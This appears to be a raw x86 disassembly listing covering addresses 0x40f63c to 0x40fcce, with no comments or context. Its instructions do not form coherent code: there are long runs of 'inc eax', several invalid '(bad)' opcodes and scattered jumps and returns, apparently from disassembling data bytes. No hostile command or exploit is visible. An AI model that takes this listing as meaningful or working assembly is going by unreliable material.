  40f63c:	add    eax,0x17446247
  40f641:	inc    eax
  40f642:	addr16 jp 0x40f5cb
  40f645:	xor    eax,0x4048460e
  40f64a:	ret    0x4040
  40f64d:	inc    eax
  40f64e:	inc    eax
  40f64f:	inc    eax
  40f650:	inc    eax
  40f651:	int3   
  40f652:	jne    0x40f694
  40f654:	add    ebp,DWORD PTR ds:0x43411c42
  40f65a:	adc    al,0xa0
  40f65c:	xchg   edx,eax
  40f65d:	cdq    
  40f65e:	mov    esp,0x4030d85a
  40f663:	dec    eax
  40f664:	mov    ch,0x5
  40f666:	cmp    eax,0x404579
  40f66b:	rol    DWORD PTR [eax+0x40],0x40
  40f66f:	inc    eax
  40f670:	add    BYTE PTR [eax-0x64],al
  40f673:	sbb    al,al
  40f675:	daa    
  40f676:	xchg   bl,al
  40f678:	inc    eax
  40f679:	mov    edx,0x6b854047
  40f67e:	and    al,0x4d
  40f680:	(bad)
  40f685:	xor    ebx,DWORD PTR [eax+0x404020ab]
  40f68b:	inc    eax
  40f68c:	inc    eax
  40f68d:	inc    eax
  40f68e:	inc    eax
  40f68f:	inc    eax
  40f690:	inc    eax
  40f691:	inc    DWORD PTR [eax-0x4a]
  40f694:	inc    ebx
  40f695:	inc    eax
  40f696:	inc    eax
  40f697:	sub    al,BYTE PTR ds:0x9015ee13
  40f69d:	outs   dx,BYTE PTR ds:[esi]
  40f69e:	je     0x40f6bd
  40f6a0:	xchg   BYTE PTR [ebx+0x4046f6a8],ch
  40f6a6:	inc    eax
  40f6a7:	push   esi
  40f6a8:	and    DWORD PTR [ecx+0x2c],ecx
  40f6ab:	dec    edi
  40f6ac:	inc    ebx
  40f6ad:	push   cs
  40f6ae:	jo     0x40f6ef
  40f6b0:	xchg   edi,eax
  40f6b1:	mov    es,WORD PTR [edi+0x4d]
  40f6b4:	rol    DWORD PTR [eax+0x40],1
  40f6b7:	inc    eax
  40f6b8:	inc    eax
  40f6b9:	inc    eax
  40f6ba:	inc    eax
  40f6bb:	inc    eax
  40f6bc:	inc    eax
  40f6bd:	inc    eax
  40f6be:	inc    eax
  40f6bf:	inc    eax
  40f6c0:	inc    eax
  40f6c1:	dec    edi
  40f6c2:	add    eax,0x94abc9dc
  40f6c7:	(bad)  
  40f6c9:	adc    al,0x86
  40f6cb:	dec    ecx
  40f6cc:	and    eax,0x40409942
  40f6d1:	imul   esi,DWORD PTR [ebx],0x1b9b035
  40f6d7:	or     DWORD PTR [eax+0x6c],eax
  40f6da:	xchg   esi,eax
  40f6db:	inc    ecx
  40f6dc:	add    eax,0x6d40cb05
  40f6e1:	inc    eax
  40f6e2:	inc    eax
  40f6e3:	inc    eax
  40f6e4:	inc    eax
  40f6e5:	inc    eax
  40f6e6:	inc    eax
  40f6e7:	inc    eax
  40f6e8:	inc    eax
  40f6e9:	add    BYTE PTR [ebx-0x797843fb],dl
  40f6ef:	inc    ecx
  40f6f0:	adc    al,0x83
  40f6f2:	sti    
  40f6f3:	xchg   BYTE PTR ds:0x40434458,bh
  40f6f9:	rcl    dh,0x33
  40f6fc:	ret    
  40f6fd:	dec    eax
  40f6fe:	xor    eax,0x3b130330
  40f703:	inc    eax
  40f704:	inc    eax
  40f705:	inc    eax
  40f706:	inc    eax
  40f707:	inc    eax
  40f708:	inc    eax
  40f709:	and    eax,0x95404040
  40f70e:	pop    esp
  40f70f:	jns    0x40f757
  40f711:	cwde   
  40f712:	inc    eax
  40f713:	inc    eax
  40f714:	push   0xb9dcab05
  40f719:	inc    edi
  40f71a:	adc    eax,0x22864012
  40f71f:	push   ds
  40f720:	ret    
  40f721:	test   DWORD PTR [eax+0x4b],eax
  40f724:	pusha  
  40f725:	ss stos DWORD PTR es:[edi],eax
  40f727:	fs dec edi
  40f729:	inc    ebx
  40f72a:	adc    al,cl
  40f72c:	dec    esi
  40f72d:	xchg   esp,eax
  40f72e:	inc    edi
  40f72f:	fs das 
  40f731:	nop
  40f732:	inc    eax
  40f733:	push   0x4040405d
  40f738:	inc    eax
  40f739:	inc    eax
  40f73a:	inc    eax
  40f73b:	inc    eax
  40f73c:	inc    eax
  40f73d:	inc    eax
  40f73e:	inc    eax
  40f73f:	add    eax,0x6330450c
  40f744:	adc    al,0xc2
  40f746:	dec    esi
  40f747:	xchg   ah,cl
  40f749:	pushf  
  40f74a:	dec    edi
  40f74b:	inc    ebx
  40f74c:	inc    eax
  40f74d:	and    DWORD PTR [edi+0x74],ebx
  40f750:	bound  edx,QWORD PTR [edx+0x34]
  40f753:	inc    eax
  40f754:	inc    eax
  40f755:	inc    eax
  40f756:	inc    eax
  40f757:	inc    eax
  40f758:	inc    eax
  40f759:	rol    DWORD PTR [eax+0x40],0xd1
  40f75d:	adc    eax,DWORD PTR [esi]
  40f75f:	dec    esi
  40f760:	inc    eax
  40f761:	clc    
  40f762:	test   al,0x50
  40f764:	aaa    
  40f765:	inc    eax
  40f766:	adc    DWORD PTR [edi+0x18],ebx
  40f769:	dec    ecx
  40f76a:	sub    esp,0x40c20e65
  40f770:	xor    al,0x35
  40f772:	sub    al,0xef
  40f774:	out    dx,al
  40f775:	inc    eax
  40f776:	sub    DWORD PTR [eax+0x40],eax
  40f779:	add    BYTE PTR [eax+0x40],al
  40f77c:	inc    eax
  40f77d:	inc    eax
  40f77e:	inc    eax
  40f77f:	inc    eax
  40f780:	push   ebx
  40f781:	adc    DWORD PTR ds:0x9850243,ecx
  40f787:	addr16 push edi
  40f789:	loopne 0x40f7ea
  40f78b:	bound  ebp,QWORD PTR [ebx+0x40404040]
  40f791:	inc    eax
  40f792:	inc    eax
  40f793:	inc    eax
  40f794:	inc    eax
  40f795:	inc    eax
  40f796:	inc    eax
  40f797:	inc    ecx
  40f798:	inc    eax
  40f799:	ret    
  40f79a:	pop    edi
  40f79b:	bound  esp,QWORD PTR [edx+0x5e]
  40f79e:	outs   dx,DWORD PTR ds:[esi]
  40f79f:	inc    ebx
  40f7a0:	pop    ds
  40f7a1:	push   esp
  40f7a2:	pop    edi
  40f7a3:	cs ins DWORD PTR es:[edi],dx
  40f7a5:	mov    BYTE PTR [eax+esi*1],dh
  40f7a8:	inc    eax
  40f7a9:	shr    edx,0xc8
  40f7ac:	xor    eax,0x14944252
  40f7b1:	fs pop ebx
  40f7b3:	arpl   WORD PTR [ebp+0x73],ax
  40f7b6:	cwde   
  40f7b7:	inc    edi
  40f7b8:	inc    eax
  40f7b9:	les    esp,FWORD PTR [edi]
  40f7bb:	dec    eax
  40f7bc:	mov    eax,0x404040af
  40f7c1:	inc    eax
  40f7c2:	inc    eax
  40f7c3:	inc    eax
  40f7c4:	int3   
  40f7c5:	jne    0x40f807
  40f7c7:	cmp    eax,0xbd301085
  40f7cc:	das    
  40f7cd:	inc    ecx
  40f7ce:	xchg   al,al
  40f7d0:	inc    ebx
  40f7d1:	inc    eax
  40f7d2:	dec    ecx
  40f7d3:	inc    ebx
  40f7d4:	jge    0x40f825
  40f7d6:	pop    esi
  40f7d7:	outs   dx,DWORD PTR ds:[esi]
  40f7d8:	nop
  40f7d9:	sbb    eax,eax
  40f7db:	mov    edi,0x3427c063
  40f7e0:	add    BYTE PTR [eax+0x32],al
  40f7e3:	sub    ch,al
  40f7e5:	inc    eax
  40f7e6:	dec    edi
  40f7e7:	inc    ecx
  40f7e8:	inc    ebx
  40f7e9:	adc    bh,dl
  40f7eb:	inc    eax
  40f7ec:	add    cl,al
  40f7ee:	inc    eax
  40f7ef:	inc    eax
  40f7f0:	inc    eax
  40f7f1:	inc    eax
  40f7f2:	add    BYTE PTR [eax+0x1f],al
  40f7f5:	cwde   
  40f7f6:	inc    eax
  40f7f7:	mov    ds:0x5040d198,al
  40f7fc:	jl     0x40f861
  40f7fe:	inc    eax
  40f7ff:	cmp    DWORD PTR ds:0x40c0031f,0x40404040
  40f809:	inc    eax
  40f80a:	inc    eax
  40f80b:	inc    eax
  40f80c:	inc    DWORD PTR [eax-0x41]
  40f80f:	inc    ecx
  40f810:	call   0x4056b8d1
  40f815:	das    
  40f816:	aas    
  40f817:	in     al,0xc8
  40f819:	adc    eax,0x4040404e
  40f81e:	inc    eax
  40f81f:	inc    eax
  40f820:	inc    eax
  40f821:	inc    eax
  40f822:	inc    eax
  40f823:	inc    eax
  40f824:	inc    eax
  40f825:	inc    ebp
  40f826:	add    eax,0x42883f50
  40f82b:	inc    edx
  40f82c:	dec    esp
  40f82d:	lds    eax,FWORD PTR [eax-0x40]
  40f830:	cmp    ebp,DWORD PTR [eax+0x41d24541]
  40f836:	add    al,0x30
  40f838:	aas    
  40f839:	inc    esi
  40f83a:	xor    al,0x30
  40f83c:	and    BYTE PTR [eax+0x40],al
  40f83f:	inc    eax
  40f840:	inc    eax
  40f841:	inc    eax
  40f842:	inc    eax
  40f843:	inc    eax
  40f844:	inc    eax
  40f845:	add    BYTE PTR [ebx+0x40],al
  40f848:	jle    0x40f872
  40f84a:	inc    ecx
  40f84b:	inc    edi
  40f84c:	mov    esp,0xc0403062
  40f851:	inc    DWORD PTR [edi-0x6f3ff258]
  40f857:	inc    eax
  40f858:	xor    bh,BYTE PTR [edi-0x678c476e]
  40f85e:	inc    edi
  40f85f:	adc    al,0xd4
  40f861:	dec    esi
  40f862:	test   al,0x5
  40f864:	fst    QWORD PTR ds:0x13c14085
  40f86a:	inc    ebp
  40f86b:	inc    eax
  40f86c:	inc    eax
  40f86d:	inc    eax
  40f86e:	inc    eax
  40f86f:	inc    eax
  40f870:	inc    eax
  40f871:	and    eax,0xc9404040
  40f876:	ins    BYTE PTR es:[edi],dx
  40f877:	enter  0x1343,0xd0
  40f87b:	add    DWORD PTR [ecx+0x42],eax
  40f87e:	push   ss
  40f87f:	mov    edx,0x40c24090
  40f884:	inc    eax
  40f885:	inc    eax
  40f886:	inc    eax
  40f887:	inc    eax
  40f888:	inc    eax
  40f889:	inc    eax
  40f88a:	inc    eax
  40f88b:	inc    eax
  40f88c:	inc    eax
  40f88d:	xor    eax,DWORD PTR [edi+0x1d15c01a]
  40f893:	or     ebx,ebp
  40f895:	push   esi
  40f896:	pushf  
  40f897:	pusha  
  40f898:	mov    eax,ds:0x604043ca
  40f89d:	jae    0x40f847
  40f89f:	(bad)
  40f8a4:	xor    cl,cl
  40f8a6:	inc    esp
  40f8a7:	jb     0x40f8e9
  40f8a9:	inc    eax
  40f8aa:	inc    eax
  40f8ab:	inc    eax
  40f8ac:	inc    eax
  40f8ad:	inc    eax
  40f8ae:	rol    DWORD PTR [eax+0x40],0x47
  40f8b2:	or     eax,0xdfc240d5
  40f8b7:	sub    bh,BYTE PTR [eax+0x142dc8a1]
  40f8bd:	xor    cl,cl
  40f8bf:	inc    esp
  40f8c0:	bound  eax,QWORD PTR [eax+0x40]
  40f8c3:	add    BYTE PTR [eax+0x40],al
  40f8c6:	inc    eax
  40f8c7:	inc    eax
  40f8c8:	inc    eax
  40f8c9:	inc    eax
  40f8ca:	adc    DWORD PTR [eax-0x29],0x42df4d40
  40f8d1:	mov    eax,ds:0x10fc89bc
  40f8d6:	shr    ebx,0xf7
  40f8d9:	push   ebp
  40f8da:	dec    edx
  40f8db:	ret    
  40f8dc:	inc    ecx
  40f8dd:	inc    eax
  40f8de:	inc    eax
  40f8df:	inc    eax
  40f8e0:	inc    eax
  40f8e1:	inc    eax
  40f8e2:	inc    eax
  40f8e3:	inc    eax
  40f8e4:	inc    eax
  40f8e5:	inc    eax
  40f8e6:	inc    eax
  40f8e7:	inc    eax
  40f8e8:	inc    ecx
  40f8e9:	mov    bh,0xc4
  40f8eb:	test   al,0xcb
  40f8ed:	mov    ebp,0x10c01943
  40f8f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8f3:	dec    eax
  40f8f4:	les    ecx,FWORD PTR [ebx+0x30]
  40f8f7:	inc    eax
  40f8f8:	daa    
  40f8f9:	mov    ebx,0x3a6341a8
  40f8fe:	mov    WORD PTR [edx],ss
  40f900:	inc    eax
  40f901:	inc    eax
  40f902:	inc    ecx
  40f903:	inc    eax
  40f904:	inc    eax
  40f905:	inc    eax
  40f906:	inc    eax
  40f907:	inc    eax
  40f908:	inc    eax
  40f909:	int3   
  40f90a:	jne    0x40f94c
  40f90c:	or     BYTE PTR [eax+eiz*1+0x50a94047],bh
  40f913:	sub    bh,BYTE PTR [ebp+eax*1+0x18038542]
  40f91a:	mov    edi,0x38736641
  40f91f:	inc    ebx
  40f920:	inc    eax
  40f921:	inc    esp
  40f922:	ja     0x40f92a
  40f924:	adc    eax,0x4090b74b
  40f929:	rcl    BYTE PTR [eax],0xfc
  40f92c:	jo     0x40f8d6
  40f92e:	jge    0x40f96a
  40f930:	inc    eax
  40f931:	das    
  40f932:	inc    eax
  40f933:	add    cl,al
  40f935:	inc    eax
  40f936:	inc    eax
  40f937:	inc    eax
  40f938:	inc    eax
  40f939:	add    BYTE PTR [eax-0x47],al
  40f93c:	imul   eax,DWORD PTR fs:[ecx+0x48744353],0xbc0511d6
  40f947:	rol    DWORD PTR es:[eax-0x40],1
  40f94b:	pop    edi
  40f94c:	ror    bl,1
  40f94e:	add    eax,0x3040f555
  40f953:	inc    eax
  40f954:	inc    eax
  40f955:	inc    eax
  40f956:	inc    eax
  40f957:	inc    eax
  40f958:	inc    eax
  40f959:	inc    eax
  40f95a:	inc    eax
  40f95b:	inc    DWORD PTR [eax+0x12]
  40f95e:	ss inc ecx
  40f960:	retf   
  40f961:	stos   DWORD PTR es:[edi],eax
  40f962:	icebp  
  40f963:	inc    eax
  40f964:	outs   dx,BYTE PTR ds:[esi]
  40f965:	adc    eax,0xbd46c9fc
  40f96a:	enter  0xc373,0x45
  40f96e:	inc    eax
  40f96f:	inc    eax
  40f970:	inc    eax
  40f971:	inc    eax
  40f972:	inc    eax
  40f973:	inc    eax
  40f974:	inc    eax
  40f975:	inc    eax
  40f976:	inc    eax
  40f977:	inc    eax
  40f978:	inc    ecx
  40f979:	push   esp
  40f97a:	inc    ecx
  40f97b:	adc    eax,0xd7fe4024
  40f980:	mov    WORD PTR ds:0x4041c8c0,cs
  40f986:	ror    ebp,0xb2
  40f989:	retf   
  40f98a:	push   edx
  40f98b:	inc    edx
  40f98c:	inc    ebx
  40f98d:	inc    eax
  40f98e:	or     eax,DWORD PTR [eax+0x40]
  40f991:	inc    eax
  40f992:	inc    eax
  40f993:	inc    eax
  40f994:	inc    eax
  40f995:	inc    eax
  40f996:	inc    eax
  40f997:	add    BYTE PTR [edi-0x80],bh
  40f99a:	inc    esp
  40f99b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f99c:	mov    dh,BYTE PTR [eax]
  40f99e:	jb     0x40f977
  40f9a0:	or     al,0xe1
  40f9a2:	inc    ebp
  40f9a3:	push   edx
  40f9a4:	ret    
  40f9a5:	mov    BYTE PTR [eax+0x7e],al
  40f9a8:	push   eax
  40f9a9:	push   esp
  40f9aa:	add    BYTE PTR [ecx-0x43],al
  40f9ad:	inc    edi
  40f9ae:	inc    eax
  40f9af:	ret    0x3c79
  40f9b2:	pusha  
  40f9b3:	cmp    al,0x46
  40f9b5:	test   DWORD PTR [eax-0x11],eax
  40f9b8:	inc    eax
  40f9b9:	inc    eax
  40f9ba:	inc    eax
  40f9bb:	inc    eax
  40f9bc:	inc    eax
  40f9bd:	inc    eax
  40f9be:	and    eax,0x3e404040
  40f9c3:	add    DWORD PTR [ebx+0x55],esp
  40f9c6:	out    0x43,al
  40f9c8:	jno    0x40f9ff
  40f9ca:	inc    eax
  40f9cb:	mov    esi,0x90306078
  40f9d0:	inc    eax
  40f9d1:	push   eax
  40f9d2:	ja     0x40f97c
  40f9d4:	test   al,0x31
  40f9d6:	fcmovnbe st,st(7)
  40f9d8:	inc    eax
  40f9d9:	ror    ah,0x14
  40f9dc:	adc    ah,BYTE PTR [ebx+0x3c]
  40f9df:	inc    eax
  40f9e0:	inc    eax
  40f9e1:	inc    eax
  40f9e2:	inc    eax
  40f9e3:	inc    eax
  40f9e4:	inc    eax
  40f9e5:	inc    eax
  40f9e6:	inc    eax
  40f9e7:	inc    eax
  40f9e8:	inc    eax
  40f9e9:	inc    ebx
  40f9ea:	inc    eax
  40f9eb:	adc    al,0xb9
  40f9ed:	cmp    edx,DWORD PTR [ecx-0x74]
  40f9f0:	mov    dh,0xd1
  40f9f2:	inc    ecx
  40f9f3:	and    DWORD PTR [edi],ecx
  40f9f5:	xchg   DWORD PTR [ecx+0x41],eax
  40f9f8:	mov    ecx,0x39c140e9
  40f9fd:	pushf  
  40f9fe:	cli    
  40f9ff:	and    cl,al
  40fa01:	mov    dl,0x40
  40fa03:	ror    BYTE PTR [edi],cl
  40fa05:	inc    eax
  40fa06:	inc    eax
  40fa07:	inc    eax
  40fa08:	inc    eax
  40fa09:	inc    eax
  40fa0a:	inc    eax
  40fa0b:	rol    DWORD PTR [eax+0x40],0x62
  40fa0f:	(bad)
  40fa13:	inc    eax
  40fa14:	les    edi,FWORD PTR [edi]
  40fa16:	and    eax,0x81376562
  40fa1b:	inc    ebx
  40fa1c:	jae    0x40fa2d
  40fa1e:	rcl    BYTE PTR [ebx+0x35],0x6d
  40fa22:	inc    ecx
  40fa23:	inc    eax
  40fa24:	inc    eax
  40fa25:	aas    
  40fa26:	sub    eax,0x433f629c
  40fa2b:	inc    eax
  40fa2c:	jno    0x40fa72
  40fa2e:	test   al,0x5d
  40fa30:	imul   edi,DWORD PTR [ebx+0x40],0x40400040
  40fa37:	inc    eax
  40fa38:	inc    eax
  40fa39:	inc    eax
  40fa3a:	inc    eax
  40fa3b:	xor    BYTE PTR [eax+0x18],al
  40fa3e:	lahf   
  40fa3f:	inc    edx
  40fa40:	arpl   WORD PTR [eax],sp
  40fa42:	mov    al,BYTE PTR [eax+eax*2+0x592a11e5]
  40fa49:	inc    ebp
  40fa4a:	mov    DWORD PTR [edi+0x40],eax
  40fa4d:	ret    0x41f6
  40fa50:	jg     0x40f9d9
  40fa52:	and    al,0x85
  40fa54:	mov    bl,0x3a
  40fa56:	jg     0x40face
  40fa58:	in     eax,dx
  40fa59:	inc    edi
  40fa5a:	rol    BYTE PTR [ebx-0x6d],1
  40fa5d:	inc    eax
  40fa5e:	inc    eax
  40fa5f:	inc    eax
  40fa60:	inc    eax
  40fa61:	inc    eax
  40fa62:	inc    eax
  40fa63:	inc    eax
  40fa64:	inc    eax
  40fa65:	inc    eax
  40fa66:	inc    eax
  40fa67:	inc    eax
  40fa68:	jp     0x40fa8e
  40fa6a:	data16 ficomp DWORD PTR [eax-0x70]
  40fa6e:	mov    ah,0x29
  40fa70:	or     bl,BYTE PTR [ebp+0x54]
  40fa73:	leave  
  40fa74:	push   edx
  40fa75:	hlt    
  40fa76:	dec    esp
  40fa77:	dec    ebx
  40fa78:	adc    al,BYTE PTR [eax+0x40]
  40fa7b:	inc    eax
  40fa7c:	inc    eax
  40fa7d:	inc    eax
  40fa7e:	inc    eax
  40fa7f:	int3   
  40fa80:	jne    0x40fac2
  40fa82:	arpl   WORD PTR [edx+ecx*2-0x35],di
  40fa86:	inc    ebx
  40fa87:	dec    ebp
  40fa88:	shr    BYTE PTR [ecx],0x3d
  40fa8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa8c:	and    eax,0x6d7fd1be
  40fa91:	loop   0x40fa76
  40fa93:	bound  edx,QWORD PTR [eax+0x4b830a6c]
  40fa99:	jno    0x40fa8f
  40fa9b:	test   BYTE PTR [ecx],ch
  40fa9d:	push   ss
  40fa9e:	dec    ebp
  40fa9f:	inc    eax
  40faa0:	lds    esp,FWORD PTR [edx+0x63]
  40faa3:	inc    eax
  40faa4:	add    cl,al
  40faa6:	inc    eax
  40faa7:	inc    eax
  40faa8:	inc    eax
  40faa9:	inc    eax
  40faaa:	add    BYTE PTR [eax+0x65],al
  40faad:	imul   esp,DWORD PTR [edx+0x48],0xf50159e
  40fab4:	test   al,0xd6
  40fab6:	lods   al,BYTE PTR ds:[esi]
  40fab7:	pop    edx
  40fab8:	mov    esi,0x7c6332c1
  40fabd:	dec    ebx
  40fabe:	add    eax,0x53cb8e41
  40fac3:	popf   
  40fac4:	inc    eax
  40fac5:	inc    eax
  40fac6:	inc    eax
  40fac7:	inc    eax
  40fac8:	inc    eax
  40fac9:	inc    eax
  40faca:	inc    eax
  40facb:	inc    eax
  40facc:	inc    DWORD PTR [eax+0x3b]
  40facf:	xor    al,0xcb
  40fad1:	inc    ebx
  40fad2:	dec    esp
  40fad3:	fidiv  DWORD PTR [ecx-0x112a9daf]
  40fad9:	xor    BYTE PTR [eax],dh
  40fadb:	(bad)  
  40fadc:	pop    eax
  40fadd:	xor    al,0x2a
  40fadf:	dec    esp
  40fae0:	inc    DWORD PTR [eax-0x7f0eea62]
  40fae6:	mov    ah,0x73
  40fae8:	inc    eax
  40fae9:	inc    edi
  40faea:	mov    esi,0x62601bc7
  40faef:	inc    ecx
  40faf0:	inc    ecx
  40faf1:	test   DWORD PTR [eax+0x49],eax
  40faf4:	cmp    al,BYTE PTR [eax+0x40]
  40faf7:	inc    eax
  40faf8:	inc    eax
  40faf9:	inc    eax
  40fafa:	inc    eax
  40fafb:	inc    eax
  40fafc:	inc    eax
  40fafd:	inc    eax
  40fafe:	inc    eax
  40faff:	arpl   WORD PTR [ebx],bp
  40fb01:	mov    ds:0xce404350,al
  40fb06:	mov    ecx,0x4d42b044
  40fb0b:	nop
  40fb0c:	inc    eax
  40fb0d:	xor    al,BYTE PTR [edi]
  40fb0f:	cmp    al,0x62
  40fb11:	aas    
  40fb12:	fist   WORD PTR [ecx+0x67d00e4c]
  40fb18:	mov    esp,0x40404040
  40fb1d:	inc    eax
  40fb1e:	inc    eax
  40fb1f:	inc    eax
  40fb20:	inc    eax
  40fb21:	add    BYTE PTR [eax+0x68],dl
  40fb24:	inc    ebx
  40fb25:	inc    eax
  40fb26:	iret   
  40fb27:	xor    al,0xd
  40fb29:	xlat   BYTE PTR ds:[ebx]
  40fb2a:	bound  ebp,QWORD PTR [ebx+0x7a3f40d1]
  40fb30:	inc    eax
  40fb31:	inc    eax
  40fb32:	inc    eax
  40fb33:	inc    eax
  40fb34:	inc    eax
  40fb35:	inc    eax
  40fb36:	and    eax,0x4a404040
  40fb3b:	adc    eax,0x402e5444
  40fb40:	inc    esi
  40fb41:	xor    BYTE PTR [ecx],dh
  40fb43:	bound  esp,QWORD PTR [eax]
  40fb45:	stos   DWORD PTR es:[edi],eax
  40fb46:	push   ebx
  40fb47:	pop    eax
  40fb48:	outs   dx,DWORD PTR ds:[esi]
  40fb49:	push   cs
  40fb4a:	xchg   BYTE PTR [ebx+0x40a044c8],bl
  40fb50:	cmp    eax,0x7354d817
  40fb55:	inc    ecx
  40fb56:	push   ebx
  40fb57:	inc    eax
  40fb58:	inc    esp
  40fb59:	sbb    DWORD PTR [ebx+0x40404040],edx
  40fb5f:	inc    eax
  40fb60:	inc    eax
  40fb61:	inc    eax
  40fb62:	inc    eax
  40fb63:	inc    eax
  40fb64:	inc    eax
  40fb65:	fs pop eax
  40fb67:	add    BYTE PTR [ecx+0x40],al
  40fb6a:	lods   eax,DWORD PTR ds:[esi]
  40fb6b:	inc    ecx
  40fb6c:	add    DWORD PTR [ecx],eax
  40fb6e:	sub    al,ah
  40fb70:	inc    ebx
  40fb71:	push   esp
  40fb72:	outs   dx,DWORD PTR ds:[esi]
  40fb73:	jg     0x40fb52
  40fb75:	xor    al,0xba
  40fb77:	inc    eax
  40fb78:	inc    eax
  40fb79:	inc    eax
  40fb7a:	inc    eax
  40fb7b:	inc    eax
  40fb7c:	inc    eax
  40fb7d:	rol    DWORD PTR [eax+0x40],0x4a
  40fb81:	xor    BYTE PTR [eax+0x35],al
  40fb84:	or     DWORD PTR [ebp+0x40],ecx
  40fb87:	and    BYTE PTR [ebx+0x1f4040fc],ch
  40fb8d:	pushf  
  40fb8e:	loope  0x40fb5c
  40fb90:	dec    esp
  40fb91:	inc    edi
  40fb92:	inc    eax
  40fb93:	jg     0x40fb2c
  40fb95:	arpl   WORD PTR [ebx],si
  40fb97:	sub    BYTE PTR [ebx+0x9515085],0x80
  40fb9e:	bound  eax,QWORD PTR [ebp+0x44]
  40fba1:	pusha  
  40fba2:	inc    eax
  40fba3:	inc    ecx
  40fba4:	inc    eax
  40fba5:	inc    eax
  40fba6:	add    BYTE PTR [eax+0x40],al
  40fba9:	inc    eax
  40fbaa:	inc    eax
  40fbab:	inc    eax
  40fbac:	inc    eax
  40fbad:	pop    ds
  40fbae:	push   eax
  40fbaf:	or     eax,0x40f0abda
  40fbb4:	jecxz  0x40fb82
  40fbb6:	add    ecx,ecx
  40fbb8:	cli    
  40fbb9:	push   eax
  40fbba:	sahf   
  40fbbb:	inc    eax
  40fbbc:	inc    ecx
  40fbbd:	jg     0x40fb9c
  40fbbf:	push   esi
  40fbc0:	inc    eax
  40fbc1:	inc    eax
  40fbc2:	inc    eax
  40fbc3:	inc    eax
  40fbc4:	inc    eax
  40fbc5:	inc    eax
  40fbc6:	inc    eax
  40fbc7:	inc    eax
  40fbc8:	inc    eax
  40fbc9:	inc    eax
  40fbca:	mov    esp,0x454caeab
  40fbcf:	xor    eax,DWORD PTR [ebx]
  40fbd1:	cs add eax,0x40404352
  40fbd7:	pop    ds
  40fbd8:	enter  0xc94a,0xab
  40fbdc:	rol    BYTE PTR [eax+0x28],cl
  40fbdf:	dec    ecx
  40fbe0:	fs and al,0x81
  40fbe3:	inc    eax
  40fbe4:	inc    eax
  40fbe5:	inc    eax
  40fbe6:	inc    eax
  40fbe7:	inc    eax
  40fbe8:	inc    eax
  40fbe9:	int3   
  40fbea:	jne    0x40fc2c
  40fbec:	inc    esp
  40fbed:	sbb    eax,DWORD PTR [eax+0x73]
  40fbf0:	mov    bh,0xc8
  40fbf2:	imul   eax,DWORD PTR [edx+0x34],0x2d40480b
  40fbf9:	push   eax
  40fbfa:	sub    eax,0x40e3464a
  40fbff:	sbb    eax,0x40f4d9
  40fc04:	rol    DWORD PTR [eax+0x40],0x40
  40fc08:	inc    eax
  40fc09:	add    BYTE PTR [eax-0x6c],al
  40fc0c:	cwde   
  40fc0d:	mov    ds:0x3829409e,al
  40fc12:	sub    eax,0x414b4262
  40fc17:	inc    eax
  40fc18:	pop    ds
  40fc19:	jmp    DWORD PTR [ebp+0x5a]
  40fc1c:	sub    bl,bl
  40fc1e:	inc    ebx
  40fc1f:	inc    esp
  40fc20:	inc    eax
  40fc21:	push   edx
  40fc22:	shl    DWORD PTR [edx+ecx*8+0x404040dc],0x40
  40fc2a:	inc    eax
  40fc2b:	inc    eax
  40fc2c:	inc    eax
  40fc2d:	inc    eax
  40fc2e:	inc    DWORD PTR [eax+0x30]
  40fc31:	inc    eax
  40fc32:	pusha  
  40fc33:	aas    
  40fc34:	bound  edi,QWORD PTR [esi+0x48f853cb]
  40fc3a:	pop    ebx
  40fc3b:	inc    edi
  40fc3c:	popa   
  40fc3d:	adc    eax,DWORD PTR [eax-0x55]
  40fc40:	inc    edi
  40fc41:	inc    eax
  40fc42:	inc    eax
  40fc43:	clc    
  40fc44:	test   al,0xa5
  40fc46:	xchg   ecx,eax
  40fc47:	pop    edi
  40fc48:	test   DWORD PTR [eax+0x2f],eax
  40fc4b:	mov    edi,0xab2b2d63
  40fc50:	inc    ebx
  40fc51:	inc    eax
  40fc52:	dec    ecx
  40fc53:	inc    eax
  40fc54:	inc    eax
  40fc55:	inc    eax
  40fc56:	inc    eax
  40fc57:	inc    eax
  40fc58:	inc    eax
  40fc59:	inc    eax
  40fc5a:	inc    eax
  40fc5b:	inc    eax
  40fc5c:	inc    eax
  40fc5d:	push   es
  40fc5e:	popa   
  40fc5f:	call   0x40d15da6
  40fc64:	inc    eax
  40fc65:	dec    eax
  40fc66:	xor    al,0x62
  40fc68:	inc    edx
  40fc69:	stos   DWORD PTR es:[edi],eax
  40fc6a:	dec    ebx
  40fc6b:	inc    eax
  40fc6c:	pusha  
  40fc6d:	mov    al,0x45
  40fc6f:	aad    0xd4
  40fc71:	inc    esp
  40fc72:	inc    ebx
  40fc73:	inc    eax
  40fc74:	dec    ebp
  40fc75:	je     0x40fbfe
  40fc77:	inc    eax
  40fc78:	inc    eax
  40fc79:	inc    eax
  40fc7a:	inc    eax
  40fc7b:	inc    eax
  40fc7c:	inc    eax
  40fc7d:	inc    eax
  40fc7e:	inc    eax
  40fc7f:	add    BYTE PTR [ebx+0x4a],bh
  40fc82:	xor    al,0xd1
  40fc84:	cdq    
  40fc85:	inc    edx
  40fc86:	inc    eax
  40fc87:	inc    esp
  40fc88:	std    
  40fc89:	sub    BYTE PTR [ecx-0x2c],cl
  40fc8c:	stos   BYTE PTR es:[edi],al
  40fc8d:	adc    eax,0x65485351
  40fc92:	mov    eax,ds:0x48a97c5c
  40fc97:	inc    eax
  40fc98:	inc    eax
  40fc99:	inc    eax
  40fc9a:	inc    eax
  40fc9b:	inc    eax
  40fc9c:	inc    eax
  40fc9d:	and    eax,0xdb404040
  40fca2:	cmp    al,0x4a
  40fca4:	ret    
  40fca5:	dec    eax
  40fca6:	fwait
  40fca7:	inc    eax
  40fca8:	mov    edi,0xbf2dbad3
  40fcad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcae:	xchg   edx,eax
  40fcaf:	add    ch,BYTE PTR ss:[eax+0x4149c213]
  40fcb6:	adc    eax,0xa504b140
  40fcbb:	retf   
  40fcbc:	pop    esp
  40fcbd:	inc    ebx
  40fcbe:	enter  0xf29,0x36
  40fcc2:	sub    eax,0x40402c4b
  40fcc7:	inc    eax
  40fcc8:	inc    eax
  40fcc9:	inc    eax
  40fcca:	inc    eax
  40fccb:	inc    eax
  40fccc:	inc    eax
  40fccd:	inc    eax
  40fcce:	inc    eax
